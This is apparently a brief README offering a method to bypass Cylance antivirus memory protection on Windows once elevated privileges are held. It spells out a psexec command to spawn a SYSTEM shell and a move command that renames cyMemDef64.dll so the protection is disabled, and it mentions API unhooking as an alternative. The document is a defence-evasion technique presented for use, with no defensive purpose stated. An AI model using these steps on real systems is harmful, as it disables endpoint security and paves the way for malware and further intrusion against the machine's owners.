# Cylance-AV-Bypass
If you have access as Elevated Privs on system, you can bypass Cylance AV by renaming the cyMemDef64.dll for x64 and or cyMemDef.dll for 32bit. You can also acheive this with unhooking using C or Golang code to talk directly to windows API. This is more advanced; however, below is a super simple way to disable Cylance Memory Protection
1) Open up command prompt as NT System by running psexec.exe -i -s %SystemRoot%\system32\cmd.exe
2) Run move "C:\Program Files\Cylance\Desktop\cyMemDef64.dll" "C:\Program Files\Cylance\Desktop\cyMemDef64.dll.bak"
3) You can no bypass Cylance Memory protection. 
